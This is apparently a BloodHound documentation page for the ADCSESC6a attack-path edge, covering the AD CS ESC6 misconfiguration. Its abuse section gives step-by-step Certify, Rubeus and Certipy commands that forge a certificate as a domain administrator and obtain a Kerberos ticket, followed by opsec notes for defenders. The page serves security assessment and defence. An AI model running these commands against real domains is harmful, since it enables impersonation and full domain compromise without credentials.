@@ -1,0 +1,88 @@
+---
+title: ADCSESC6a
+description: The principal has permission to enroll on one or more certificate templates allowing for authentication.
+---
+
+<img noZoom src="/assets/enterprise-AND-community-edition-pill-tag.svg" alt="Applies to BloodHound Enterprise and CE"/>
+
+
+They also have enrollment permission for an enterprise CA with the necessary templates published. This
+enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest.
+The enterprise CA is configured with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag allowing enrollees to
+specify a Subject Alternate Name (SAN) identifying another principal during certificate enrollment of
+any published certificate template. This setup allow an attacker principal to obtain a malicious
+certificate as any AD forest user or computer and use it for authentication and impersonation without
+knowing their credentials.
+
+## Abuse Info
+
+### Windows
+
+Step 1: Use Certify (2.0) to request enrollment in the affected template, specifying the affected enterprise CA and target principal to impersonate (include the SID URL if strong mapping is enforced):
+
+```cmd
+Certify.exe request --ca rootdomaindc.forestroot.com\forestroot-RootDomainDC-CA --template ESC6 --upn ForestRootDA --sid-url S-1-5-21-2697957641-2271029196-387917394-500
+```
+
+The certificate PFX is printed to the console in a base64-encoded format.
+
+If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.
+
+Step 2: With Rubeus, use the certificate to authenticate to the domain and request a TGT, specifying the identity you intend to impersonate:
+
+```cmd
+Rubeus asktgt /user:ForestRootDA /domain:forestroot.com /certificate:<cert base64> /ptt
+```
+
+Step 3 (optional): Verify the TGT by listing it with klist:
+
+```cmd
+klist
+```
+
+### Linux
+
+Step 1: Use Certipy to request enrollment in the affected template, specifying the affected
+certification authority and target principal to impersonate:
+
+```bash
+certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local
+```
+
+If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.
+
+Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller::
+
+```bash
+ certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128
+```
+
+If the authentication fails then it may be because the DC enforces strong certificate mapping. This
+requirement can be met by including a URL parameter in the SAN with the target's SID, however not
+supported by Certipy. See the Windows abuse section for example.
+
+## Opsec Considerations
+
+When the affected certificate authority issues the certificate to the attacker, it will retain a local copy
+of that certificate in its issued certificates store. Defenders may analyze those issued certificates to
+identify illegitimately issued certificates and identify the principal that requested the certificate, as
+well as the target identity the attacker is attempting to impersonate.
+
+## Edge Schema
+
+Source: [User](/resources/nodes/user), [Group](/resources/nodes/group), [Computer](/resources/nodes/computer)  
+Destination: [Domain](/resources/nodes/domain)  
+Traversable: **Yes**   
+
+## References
+
+This edge is related to the following MITRE ATT&CK tactic and techniques:
+
+* [https://attack.mitre.org/techniques/T1649/](https://attack.mitre.org/techniques/T1649/)
+
+### Abuse and Opsec references
+
+* Certipy 4.0
+* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+* [https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/preview-of-san-uri-for-certificate-strong-mapping-for-kb5014754/ba-p/3789785](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/preview-of-san-uri-for-certificate-strong-mapping-for-kb5014754/ba-p/3789785)
+* [ADCS Attack Paths in BloodHound—Part 3](https://specterops.io/blog/2024/09/11/adcs-attack-paths-in-bloodhound-part-3/)
